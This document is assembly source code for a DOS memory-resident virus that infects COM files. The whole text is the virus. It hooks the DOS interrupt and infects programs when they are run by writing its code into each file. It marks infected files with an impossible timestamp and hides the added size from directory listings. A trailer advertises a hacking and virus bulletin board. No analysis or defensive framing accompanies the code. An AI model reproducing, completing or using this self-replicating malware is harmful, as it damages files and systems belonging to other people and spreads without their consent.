;
;
;
                org     100h

ofs:
                push    100h
                push    ax
                push    ds
                push    es
                mov     dx,054h-(ofs/16)
                mov     es,dx
                mov     ax,es:ofs[0]
                cmp     ax,ofs[0]
                je      to_host

                lea     si,ofs
                mov     di,si
                mov     cx,virlength
                rep     movsb

                mov     ds,es
                mov     ax,3521h
                int     21h
                mov     word ptr ds:old21[0],bx
                mov     word ptr ds:old21[2],es

                mov     ax,2521h
                lea     dx,new21
                int     21h

to_host:        pop     es
                pop     ds
                mov     di,0fe00h
                lea     si,relocator
                mov     cx,rellength
                rep     movsb
                jmp     0fe00h

old21           dd 0

relocator:
                mov     di,100h
orgofs:         lea     si,orgp
                mov     cx,virlength
                rep     movsb
                pop     ax
                ret

rellength       equ     $-relocator

new21:
                cmp     ah,11h
                je      findfcb
                cmp     ah,12h
                je      findfcb
                cmp     ah,4eh
                je      find
                cmp     ah,4fh
                je      find
                cmp     ax,4b00h
                je      exec

                jmp     short dword ptr cs:[old21]

getdta:
                pop si
                pushf
                push ax
                push bx
                push es
                mov  ah,2fh
                call dos
                jmp short si

FindFCB:        call    DOS                             ; call orginal interrupt
                cmp     al,0                            ; error ?
                jne     Ret1
                call    getdta
                cmp     byte ptr es:[bx],-1             ; extended fcb ?
                jne     FCBOk
                add     bx,8                            ; yes, skip 8 bytes
FCBOk:          mov     al,es:[bx+16h]                  ; get file-time (low byte)
                and     al,1fh                          ; seconds
                cmp     al,1fh                          ; 62 seconds ?
                jne     FileOk                          ; no, file not infected
                sub     word ptr es:[bx+1ch],Virlength  ; adjust file-size
                sbb     word ptr es:[bx+1eh],0
                jmp     short Time

Find:           call    DOS
                jc      Ret1
                call    getdta
                mov     al,es:[bx+16h]
                and     al,1fh
                cmp     al,1fh
                jne     FileOk
                sub     word ptr es:[bx+1ah],VirLength
                sbb     word ptr es:[bx+1ch],0
Time:           xor     byte ptr es:[bx+16h],10h
FileOk:         pop     es
                pop     bx
                pop     ax
                popf
Ret1:           retf    2

exec:           push    ax
                push    bx
                push    cx
                push    dx
                push    ds
                push    es
                mov     ax,3d02h
                call    dos
                mov     bx,0bc00h
                mov     ds,bx
                mov     bh,3fh
                xchg    ax,bx
                xor     dx,dx
                mov     cx,virlength
                call    dos
                cmp     word ptr ds:[0],'ZM'
                je      exe
                cmp     word ptr ds:[0],0068h   ; push 100
                jne     noexe
exe:            mov     ah,3eh
                call    dos
                pop     es
                pop     ds
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                jmp     short dword ptr cs:[old21]

noexe:          mov     ax,4202h
                xor     cx,cx
                xor     dx,dx
                call    dos
                cmp     ax,0fd00h
                jae     exe
                cmp     ax,virlength+10
                jb      exe
                inc     ah
                mov     word ptr cs:orgofs[1],ax

                mov     ax,5700h
                call    dos
                or      cx,1fh
                push    cx
                push    dx

                mov     ah,40h
                xor     dx,dx
                mov     cx,virlength
                push    cx
                call    dos

                mov     ax,4200h
                xor     cx,cx
                xor     dx,dx
                call    dos

                mov     ah,40h
                mov     ds,cs
                lea     dx,ofs
                pop     cx
                call    dos
                mov     ax,5701h
                pop     dx
                pop     cx
                call    dos

                jmp     short exe

dos:            pushf
                call    dword ptr cs:[old21]
                ret

virlength        equ     $-ofs

orgp:            int     20h

;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
;  컴컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴
;  컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴
;  컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�
